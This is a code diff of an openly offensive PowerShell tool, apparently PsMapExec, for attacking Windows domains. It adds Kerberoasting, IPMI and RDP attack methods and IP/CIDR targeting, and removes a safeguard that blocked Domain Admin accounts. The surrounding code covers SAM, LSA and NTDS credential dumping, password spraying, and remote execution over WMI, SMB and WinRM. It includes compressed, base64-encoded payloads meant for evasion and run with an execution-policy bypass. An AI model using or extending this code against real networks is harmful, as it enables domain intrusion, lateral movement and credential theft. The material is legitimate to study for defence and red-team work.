+            Resolve-DnsNameWithTimeout -IPAddress $ComputerName -Timeout 5000
         }
+
+
+        # IP Address in use, display nothing in column
+        else {}
 
         # Display ComputerName and OS
         Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
         Write-Host "   " -NoNewline
-        Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
+        if (!$IPAddress) { Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline }
         Write-Host "   " -NoNewline
 
         # Display status symbol and text
@@ -1019,11 +1280,14 @@ Version : 0.4.7")
     $Spraying = Join-Path $PME "Spraying"
     $VNC = Join-Path $PME "VNC"
     $NTDS = Join-Path $PME "NTDS"
+    $Kerberoast = Join-Path $PME "Kerberoast"
+    $IPMI = Join-Path $PME "IPMI"
+    $RDP = Join-Path $PME "RDP"
 
     $directories = @(
         $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
         $LSA, $KerbDump, $MimiTickets, $ConsoleHistory, $Sessions, 
-        $UserFiles, $Spraying, $VNC, $NTDS
+        $UserFiles, $Spraying, $VNC, $NTDS, $Kerberoast, $IPMI, $RDP
     )
 
     foreach ($directory in $directories) {
@@ -1060,10 +1324,6 @@ Version : 0.4.7")
             Write-Verbose "Ticket function already loaded"
         }
     }
-
-
-
-
 
     ################################################################################################################
     ##################################### Ticket logic for authentication ##########################################
@@ -1126,8 +1386,6 @@ Version : 0.4.7")
         Establish-LDAPSession -Domain $Domain
     }
 
-
-
     function New-Searcher {
         $directoryEntry = [ADSI]"LDAP://$domain"
         $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
@@ -1137,150 +1395,250 @@ Version : 0.4.7")
         return $searcher
     }
 
-    if ($Method -ne "Spray") {
-        if (!$IPAddress) {
-            $searcher = New-Searcher
-            $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+    function Get-SubnetAddresses {
+        Param (
+            [IPAddress]$IP,
+            [ValidateRange(0, 32)][int]$MaskBits
+        )
 
-            if ($Targets -match "^\*.*|.*\*$") {
-                Write-Verbose "Obtaining wildcard computers (Enabled) from LDAP query"
-                $wildcardFilter = $Targets -replace "\*", "*"
-                $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(dnshostname=$wildcardFilter))"
-                $computers = $searcher.FindAll() | Where-Object {
-                    $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+        $mask = ([Math]::Pow(2, $MaskBits) - 1) * [Math]::Pow(2, (32 - $MaskBits))
+        $maskBytes = [BitConverter]::GetBytes([UInt32]$mask)
+        $dottedMask = [IPAddress]((3..0 | ForEach-Object { [String]$maskBytes[$_] }) -join '.')
+
+        $lower = [IPAddress]($IP.Address -band $dottedMask.Address)
+
+        $lowerBytes = [BitConverter]::GetBytes([UInt32]$lower.Address)
+        [IPAddress]$upper = (0..3 | % { $lowerBytes[$_] + ($maskBytes[(3 - $_)] -bxor 255) }) -join '.'
+
+        $ips = @($lower, $upper)
+        return $ips
+    }
+
+    function Get-IpRange {
+        [CmdletBinding(ConfirmImpact = 'None')]
+        Param(
+            [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
+            [string[]] $Targets
+        )
+
+        process {
+            $Computers = @()
+            foreach ($subnet in $Targets) {
+                if ($subnet -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') {
+                    # Treat as a single IP address
+                    $Computers += $subnet
                 }
-            } 
-        
-            elseif ($Targets -eq "Workstations") {
-                if ($Global:TargetsWorkstations -ne $null) {
-                    $Computers = $Global:TargetsWorkstations | Select-Object *
-                }
-                else {
-                    Write-Verbose "Obtaining Workstations (Enabled) from LDAP query"
-                    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-                    $computers = $searcher.FindAll() | Where-Object {
-                        $_.Properties["operatingSystem"][0] -notlike "*windows*server*" -and
-                        $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+                elseif ($subnet -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$') {
+                    # CIDR notation processing
+                    $IP = ($subnet -split '\/')[0]
+                    [int]$SubnetBits = ($subnet -split '\/')[1]
+                    if ($SubnetBits -lt 20 -or $SubnetBits -gt 30) {
+                        Write-Warning -Message 'Enter a mask between 20 and 30'
+                        continue
+                    }
+                    $Octets = $IP -split '\.'
+                    $IPInBinary = @()
+                    foreach ($Octet in $Octets) {
+                        $OctetInBinary = [convert]::ToString($Octet, 2).PadLeft(8, '0')
+                        $IPInBinary += $OctetInBinary
+                    }
+                    $IPInBinary = $IPInBinary -join ''
+                    $HostBits = 32 - $SubnetBits
+                    $NetworkIDInBinary = $IPInBinary.Substring(0, $SubnetBits)
+                    $HostIDInBinary = '0' * $HostBits
+                    $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 2 # -2 to exclude network and broadcast addresses
+                    For ($i = 1; $i -le $imax; $i++) {
+                        $NextHostIDInDecimal = $i
+                        $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal, 2).PadLeft($HostBits, '0')
+                        $NextIPInBinary = $NetworkIDInBinary + $NextHostIDInBinary
+                        $IP = @()
+                        For ($x = 0; $x -lt 4; $x++) {
+                            $StartCharNumber = $x * 8
+                            $IPOctetInBinary = $NextIPInBinary.Substring($StartCharNumber, 8)
+                            $IPOctetInDecimal = [convert]::ToInt32($IPOctetInBinary, 2)
+                            $IP += $IPOctetInDecimal
+                        }
+                        $IP = $IP -join '.'
+                        $Computers += $IP
                     }
                 }
-
-                $Global:TargetsWorkstations = $computers | Select-Object *
-        
-            } 
-        
-            elseif ($Targets -eq "Servers") {
-                if ($Global:TargetsServers -ne $null) {
-                    $computers = $Global:TargetsServers | Select-Object *
-                }
                 else {
-                    Write-Verbose "Obtaining Servers (Enabled) from LDAP query"
-                    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"
+                    Write-Error -Message "Input [$subnet] is not in a valid format"
+                }
+            }
+            return $Computers
+        }
+    }
+
+    function IsIPAddressOrCIDR {
+        param ([string]$Target)
+
+        # Regular expressions for IP address and CIDR notation
+        $ipPattern = '^\d{1,3}(\.\d{1,3}){3}$'
+        $cidrPattern = '^\d{1,3}(\.\d{1,3}){3}\/\d{1,2}$'
+
+        # Check if the target matches either the IP address or CIDR pattern
+        return $Target -match $ipPattern -or $Target -match $cidrPattern
+    }
+
+    # Check if Targets is a valid IP or CIDR
+    if (IsIPAddressOrCIDR $Targets) {
+        $Computers = Get-IpRange -Targets $Targets
+        $IPAddress = $true
+    }
+    else { $IPAddress = $False }
+    
+    if (!$IPAddress) {
+        if ($Method -ne "Kerberoast" -and $Method -ne "Spray") {
+            if (!$IPAddress) {
+                $searcher = New-Searcher
+                $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+
+                if ($Targets -match "^\*.*|.*\*$") {
+                    Write-Verbose "Obtaining wildcard computers (Enabled) from LDAP query"
+                    $wildcardFilter = $Targets -replace "\*", "*"
+                    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(dnshostname=$wildcardFilter))"
                     $computers = $searcher.FindAll() | Where-Object {
                         $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
                     }
-                }
-
-                $Global:TargetsServers = $computers | Select-Object *
+                } 
         
-            } 
-        
-            elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
-                if ($Global:TargetsDomainControllers -ne $null) {
-                    $computers = $Global:TargetsDomainControllers | Select-Object *
-                }
-                else {
-                    Write-Verbose "Obtaining Domain Controllers (Enabled) from LDAP query"
-                    $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-                    $computers = $searcher.FindAll()
-                }
-
-                $Global:TargetsDomainControllers = $computers | Select-Object *
-        
-            } 
-        
-            elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
-                if ($Global:TargetsAll -ne $null) {
-                    $computers = $Global:TargetsAll | Select-Object *
-                }
-                else {
-                    Write-Verbose "Obtaining all (Enabled) systems from LDAP query"
-                    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-                    $computers = $searcher.FindAll() | Where-Object {
-                        $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+                elseif ($Targets -eq "Workstations") {
+                    if ($Global:TargetsWorkstations -ne $null) {
+                        $Computers = $Global:TargetsWorkstations | Select-Object *
                     }
-                }
+                    else {
+                        Write-Verbose "Obtaining Workstations (Enabled) from LDAP query"
+                        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+                        $computers = $searcher.FindAll() | Where-Object {
+                            $_.Properties["operatingSystem"][0] -notlike "*windows*server*" -and
+                            $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+                        }
+                    }
 
-                $computers = $Global:TargetsAll = $computers | Select-Object *
+                    $Global:TargetsWorkstations = $computers | Select-Object *
         
-            } 
+                } 
         
-            elseif ($Targets -notmatch "\*") {
-                if ($IsFile) {
-                    $fileContent = Get-Content -Path $Targets
-                    $computers = @()
+                elseif ($Targets -eq "Servers") {
+                    if ($Global:TargetsServers -ne $null) {
+                        $computers = $Global:TargetsServers | Select-Object *
+                    }
+                    else {
+                        Write-Verbose "Obtaining Servers (Enabled) from LDAP query"
+                        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"
+                        $computers = $searcher.FindAll() | Where-Object {
+                            $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+                        }
+                    }
 
-                    foreach ($line in $fileContent) {
-                        # Split the line by comma and trim any spaces
-                        $names = $line -split ',' | ForEach-Object { $_.Trim() }
+                    $Global:TargetsServers = $computers | Select-Object *
+        
+                } 
+        
+                elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
+                    if ($Global:TargetsDomainControllers -ne $null) {
+                        $computers = $Global:TargetsDomainControllers | Select-Object *
+                    }
+                    else {
+                        Write-Verbose "Obtaining Domain Controllers (Enabled) from LDAP query"
+                        $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+                        $computers = $searcher.FindAll()
+                    }
 
-                        foreach ($name in $names) {
-                            if ([string]::IsNullOrWhiteSpace($name)) {
-                                continue
-                            }
+                    $Global:TargetsDomainControllers = $computers | Select-Object *
+        
+                } 
+        
+                elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
+                    if ($Global:TargetsAll -ne $null) {
+                        $computers = $Global:TargetsAll | Select-Object *
+                    }
+                    else {
+                        Write-Verbose "Obtaining all (Enabled) systems from LDAP query"
+                        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+                        $computers = $searcher.FindAll() | Where-Object {
+                            $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+                        }
+                    }
 
-                            if ($name -notlike "*.*") {
-                                $name += ".$domain"
-                            }
+                    $computers = $Global:TargetsAll = $computers | Select-Object *
+        
+                } 
+        
+                elseif ($Targets -notmatch "\*") {
+                    if ($IsFile) {
+                        $fileContent = Get-Content -Path $Targets
+                        $computers = @()
 
-                            $searcher.Filter = "(dnshostname=$name)"
-                            $result = $searcher.FindOne()
+                        foreach ($line in $fileContent) {
+                            # Split the line by comma and trim any spaces
+                            $names = $line -split ',' | ForEach-Object { $_.Trim() }
 
-                            if ($result -ne $null) {
-                                $computers += $result.GetDirectoryEntry()
-                            }
-                            else {
-                                Write-Warning "No LDAP entry found for $name"
+                            foreach ($name in $names) {
+                                if ([string]::IsNullOrWhiteSpace($name)) {
+                                    continue
+                                }
+
+                                if ($name -notlike "*.*") {
+                                    $name += ".$domain"
+                                }
+
+                                $searcher.Filter = "(dnshostname=$name)"
+                                $result = $searcher.FindOne()
+
+                                if ($result -ne $null) {
+                                    $computers += $result.GetDirectoryEntry()
+                                }
+                                else {
+                                    Write-Warning "No LDAP entry found for $name"
+                                }
                             }
                         }
                     }
-                }
-                else {
-                    Write-Host "Targets : $Targets"
-                    if ($Targets -notlike "*.*") {
-                        $Targets += ".$domain"
-                    }
-                    $searcher.Filter = "(dnshostname=$Targets)"
-                    $result = $searcher.FindOne()
-
-                    if ($result -ne $null) {
-                        $computers = @($result.GetDirectoryEntry())
-                    }
                     else {
-                        Write-Host
-                        Write-Warning "No LDAP entry found for the computer: $Targets"
-                        $computers = @()
-                        RestoreTicket
-                        continue
+                        Write-Host "Targets : $Targets"
+                        if ($Targets -notlike "*.*") {
+                            $Targets += ".$domain"
+                        }
+                        $searcher.Filter = "(dnshostname=$Targets)"
+                        $result = $searcher.FindOne()
+
+                        if ($result -ne $null) {
+                            $computers = @($result.GetDirectoryEntry())
+                        }
+                        else {
+                            Write-Host
+                            Write-Warning "No LDAP entry found for the computer: $Targets"
+                            $computers = @()
+                            RestoreTicket
+                            continue
+                        }
                     }
                 }
             }
+    
+            # Ensure we only have unique entries. Mostly to resolve duplicate entries from file
+            $computers = $computers | Select-Object -Unique *
+    
+            $ComputerCount = ($Computers).Count
+            Write-Verbose "Total number of objects queried: $ComputerCount"
         }
-    
-        # Ensure we only have unique entries. Mostly to resolve duplicate entries from file
-        $computers = $computers | Select-Object -Unique *
-    
-        $ComputerCount = ($Computers).Count
-        Write-Verbose "Total number of objects queried: $ComputerCount"
     }
 
+    if ($IPAddress -and $Method -eq "MSSQL") {
+        Write-Host
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "IP Address targeting and MSSQL method not yet supported together"
+        return
 
+    }
 
     Write-Output ""
 
     ################################################################################################################
     ############################ Grab interesting users for various parsing functions ##############################
     ################################################################################################################
-
 
     function Get-GroupMembers {
         param ([string]$GroupName)
@@ -1338,7 +1696,6 @@ Version : 0.4.7")
         }
     }
 
-
     if ($Method -eq "Spray") {
     
         Write-Verbose "Performing user LDAP queries for method (Spray)"
@@ -1372,6 +1729,49 @@ Version : 0.4.7")
         }
     }
 
+    if ($Method -eq "IPMI" -and $Option -eq "IPMI:DomainUsers") {
+        Write-Verbose "Performing user LDAP queries for method (IPMI)"
+        $searcher = New-Searcher
+        $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
+        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
+        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] 
+
+        }
+    }
+
+    if ($Method -eq "Kerberoast") {
+    
+        $searcher = New-Searcher
+
+        if ($Option -like "Kerberoast:*") {
+            $SplitUser = $Option.Split(':')[1]
+         
+            Write-Verbose "Performing single user LDAP query (Kerberoast)($SplitUser)"
+            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$SplitUser)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(ServicePrincipalName=*))"
+        }
+        else {
+        
+            Write-Verbose "Performing user LDAP queries for method (Kerberoast)"
+            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(ServicePrincipalName=*))"
+        }
+
+        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
+    
+        $RoastUsers = @($users | ForEach-Object { $_.Properties["samAccountName"][0] })
+
+        if ($RoastUsers.Count -eq 0) {
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "No candidate user objects found"
+            return
+        }
+        else {
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "Found $($RoastUsers.Count) roastable Users"
+            Write-Host
+        }
+    }
 
     # Grab Computer Accounts for spraying
     function Get-ComputerAccounts {
@@ -1393,55 +1793,25 @@ Version : 0.4.7")
     #$ComputerSamAccounts = Get-ComputerAccounts
 
 
-    if (!$LocalAuth) {
-        if ($Method -ne "RDP") {
-            if (!$Force) {
-                foreach ($EnterpriseAdmin in $EnterpriseAdmins) {
-                    $splitResult = $Username -split [regex]::Escape($EnterpriseAdmin)
-                    if ($splitResult.Count -gt 1) {
-                        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-                        Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
-                        RestoreTicket
-                        
-                        return
-                    }
-                }
-            }
-
-            if (!$Force) {
-                foreach ($DomainAdmin in $DomainAdmins) {
-                    $splitResult = $Username -split [regex]::Escape($DomainAdmin)
-                    if ($splitResult.Count -gt 1) {
-                        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-                        Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
-                        RestoreTicket
-                        
-                        return
-                    }
-                }
-            }
-        }
-
+    if (!$LocalAuth) { 
         if (!$CurrentUser) {
-            if ($Method -ne "GenRelayList") {
-                if ($Method -ne "SessionHunter") {
-                    if ($Method -ne "Spray") {
-                        try {
-                            $searcher = New-Searcher
-                            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
-                            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
-                            $user = $searcher.FindOne()
-                            $domainUser = $user.Properties["samAccountName"]
-                        }
-                        Catch {
+            if ($Method -ne "GenRelayList" -or $Method -ne "Kerberoasting" -or $Method -ne "Spray") {
+                if ($Method -ne "Spray") {
+                    try {
+                        $searcher = New-Searcher
+                        $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
+                        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+                        $user = $searcher.FindOne()
+                        $domainUser = $user.Properties["samAccountName"]
+                    }
+                    Catch {
            
-                            if ($Ticket -ne $null) {} 
-                            elseif (!$DomainUser) {
-                                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-                                Write-Host "Specified username is not a valid domain user"
-                                return
-                
-                            }
+                        if ($Ticket -ne $null) {} 
+                        elseif (!$DomainUser) {
+                            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
+                            Write-Host "Specified username is not a valid domain user"
+                            return
+                                           
                         }
                     }
                 }
@@ -1489,7 +1859,6 @@ Version : 0.4.7")
         Write-Host "SMB Signing output will be written to $SMB"
     }
 
-
     ################################################################################################################
     ######################################## Local scripts and modules #############################################
     ################################################################################################################
@@ -1520,8 +1889,6 @@ if (-not $foundHistoryFile) {
 }
 
 '@
-
-
 
     $Files = @'
 $usersFolderPath = "C:\Users"
@@ -1609,7 +1976,6 @@ foreach ($user in $users) {
 }
 '@
 
-
     # The scripts below are compressed to help aid in basic evasion
 
     # Highly compressed revision of this script: https://github.com/The-Viper-One/PME-Scripts/blob/main/DumpSAM.ps1
@@ -1647,7 +2013,6 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
         $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
         $Command = "powershell.exe -ep bypass -enc $base64command"
     }
-
 
     # Amnesiac
     if ($Module -eq "Amnesiac") {
@@ -1768,26 +2133,25 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
         $Command = "powershell.exe -ep bypass -enc $base64command"
     }
 
-
-
     elseif ($Module -eq "" -and $Command -ne "") {
         $base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
         $Command = "powershell.exe -ep bypass -enc $base64Command"
     }
 
-
     ################################################################################################################
     ################################# Logic to help keep output tidy and even ######################################
     ################################################################################################################
 
-    if ($Method -ne "Spray" -and !$IPAddress) {
+    # First conditional check
+    if ($Method -ne "Spray" -and $Method -ne "Kerberoast" -and !$IPAddress) {
         $NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
         $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
     }
 
-    elseif ($Method -ne "Spray" -and $IPAddress) {
+    # Second conditional check
+    elseif ($Method -ne "Spray" -and $Method -ne "Kerberoast" -and $IPAddress) {
         $NameLength = 16
-        $OSLength = 14
+        $OSLength = 0
     }
 
     ################################################################################################################
@@ -1799,7 +2163,6 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
         $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
         $runspacePool.Open()
         $runspaces = New-Object System.Collections.ArrayList
-
 
         $scriptBlock = {
             param ($computerName, $Command, $Username, $Password, $LocalAuth, $Timeout)
@@ -1823,7 +2186,6 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
 
             $tcpClient.Close()
             if (!$connected) { return "Unable to connect" }
-
 
             # Function to perform WMI operations
             Function WMI {
@@ -1983,7 +2345,6 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
             If ($LocalAuth) { WMI -ComputerName $ComputerName -Command $Command -LocalAuth -Username $Username -Password $Password }
             else { WMI -ComputerName $ComputerName  -Command $Command }
 
-
         }
 
         # Create and invoke runspaces for each computer
@@ -2001,7 +2362,6 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
                 $OS = "OS:PLACEHOLDER"
             }
 
-
             $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Timeout)
             $runspace.RunspacePool = $runspacePool
 
@@ -2013,9 +2373,6 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
                     Completed    = $false
                 })
         }
-
-
-
 
         # Poll the runspaces and display results as they complete
         do {
@@ -2114,8 +2471,6 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
         $runspacePool.Close()
         $runspacePool.Dispose()
 
-
-
     }
 
     ################################################################################################################
@@ -2162,7 +2517,6 @@ $a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object I
             if ([string]::IsNullOrWhiteSpace($Command)) {
                 return "Successful connection PME"
             }
-
 
     
             function Enter-SMBSession {
@@ -2311,7 +2665,6 @@ while (`$true) {
             return Enter-SMBSession -ComputerName $ComputerName -Command $Command
         }
 
-
         # Create and invoke runspaces for each computer
         foreach ($computer in $computers) {
 
@@ -2346,7 +2699,6 @@ while (`$true) {
                     $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                     $hasDisplayedResult = $false
                     try { $result = $result.Trim() } catch {}
-
 
                     # [other conditions for $result]
                     if ($result -eq "Access Denied") {
@@ -2432,12 +2784,9 @@ while (`$true) {
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
 
-
         # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
-
-
 
     }
 
@@ -2453,7 +2802,7 @@ while (`$true) {
         $runspaces = New-Object System.Collections.ArrayList
 
         $scriptBlock = {
-            param ($computerName, $Command, $Timeout, $Module)
+            param ($computerName, $Command, $Timeout, $Module, $IPAddress)
     
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
@@ -2474,6 +2823,27 @@ while (`$true) {
 
             $tcpClient.Close()
             if (!$connected) { return "Unable to connect" }
+
+            if ($IPAddress) {
+                # Define the function before using it
+                function Resolve-IPToDNSName {
+                    param (
+                        [string]$IPAddress
+                    )
+                    try {
+                        $hostEntry = [System.Net.Dns]::GetHostEntry($IPAddress)
+                        return $hostEntry.HostName
+                    }
+                    catch {
+                        return "Unable to resolve"
+                    }
+                }
+
+                # Use the function to resolve DNS Name
+                $ComputerName = Resolve-IPToDNSName -IPAddress $ComputerName
+                if ($ComputerName -eq "Unable to resolve") { return "Unable to resolve" }
+
+            }
       
             try {
                 # Leave these comments here because its a clusterfuck
@@ -2539,22 +2909,32 @@ while (`$true) {
                 elseif ($_.Exception.Message -like "*cannot be resolved*") {
                     return "Unable to connect"
                 }
+
+                elseif ($_.Exception.Message -like "*cannot find the computer*") {
+                    return "cannot find the computer"
+                }
+
                 else {
                     return "Unspecified Error"
                 }
             }
-
-
 
         }
 
         # Create and invoke runspaces for each computer
         foreach ($computer in $computers) {
 
-            $ComputerName = $computer.Properties["dnshostname"][0]
-            $OS = $computer.Properties["operatingSystem"][0]
+            if (!$IPAddress) {
+                $ComputerName = $computer.Properties["dnshostname"][0]
+                $OS = $computer.Properties["operatingSystem"][0]
+            }
+
+            elseif ($IPAddress) {
+                $ComputerName = "$Computer"
+                $OS = "OS:PLACEHOLDER"
+            }
     
-            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Module)
+            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Module).AddArgument($IPAddress)
             $runspace.RunspacePool = $runspacePool
 
             [void]$runspaces.Add([PSCustomObject]@{
@@ -2585,7 +2965,22 @@ while (`$true) {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                         continue
+                    }
+                    
+                    elseif ($result -eq "Unable to resolve") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "Unable to resolve DNS name, required for WinRM" -NameLength $NameLength -OSLength $OSLength
+                        continue
+
                     } 
+
+                    elseif ($result -like "*Cannot find the computer*") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "Unable to fully resolve the FQDN" -NameLength $NameLength -OSLength $OSLength
+                        continue
+
+                    } 
+
                     elseif ($result -eq "Timed Out") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
@@ -2657,17 +3052,16 @@ while (`$true) {
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
 
-
         # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
 
     }
 
-
     ################################################################################################################
     ################################################# Function: RDP ################################################
     ################################################################################################################
+   
     Function Method-RDP {
         $ErrorActionPreference = "SilentlyContinue"
         Write-Host
@@ -2714,7 +3108,7 @@ while (`$true) {
 
             elseif ($IPAddress) {
                 $ComputerName = $Computer
-                $OS = "BLANK"
+                $OS = "OS:PLACEHOLDER"
             }
     
             $runspace = [powershell]::Create().AddScript($RunSpaceScriptBlock).AddArgument($ComputerName).AddArgument($Timeout)
@@ -2756,7 +3150,6 @@ while (`$true) {
         $runspacePool.Close()
         $runspacePool.Dispose()
 
-
         foreach ($Computer in $Computers) {
     
             if (!$IPAddress) {
@@ -2774,8 +3167,33 @@ while (`$true) {
 
             $ScriptBlock = {
 
-                Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp)
+                Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp, $IPAddress, $RDP)
                 Invoke-Expression -Command $Global:irdp
+
+                function Resolve-DnsNameWithTimeout {
+                    param(
+                        [string]$IPAddress,
+                        [int]$Timeout
+                    )
+                    try {
+                        $timeoutTask = [timespan]::FromMilliseconds($Timeout)
+                        $task = [System.Net.Dns]::GetHostEntryAsync($IPAddress)
+
+                        $sw = [System.Diagnostics.Stopwatch]::StartNew()
+
+                        if ($task.Wait($timeoutTask)) {
+                            $sw.Stop() # Stop the stopwatch
+                            Write-Host ("{0,-44}" -f $($task.Result.HostName)) -NoNewline
+                        }
+                        else {
+                            $sw.Stop()
+                            Write-Host ("{0,-44}" -f "") -NoNewline
+                        }
+                    }
+                    catch {
+                        Write-Host ("{0,-44}" -f "") -NoNewline
+                    } 
+                }
 
                 function Display-ComputerStatus {
                     param (
@@ -2791,28 +3209,37 @@ while (`$true) {
                     # Prefix
                     Write-Host "RDP " -ForegroundColor Yellow -NoNewline
                     Write-Host "   " -NoNewline
-    
-                    # Resolve IP
-                    $IP = $null
-                    $Ping = New-Object System.Net.NetworkInformation.Ping 
-                    $Result = $Ping.Send($ComputerName, 15)
-                    if ($Result.Status -eq 'Success') {
-                        $IP = $Result.Address.IPAddressToString
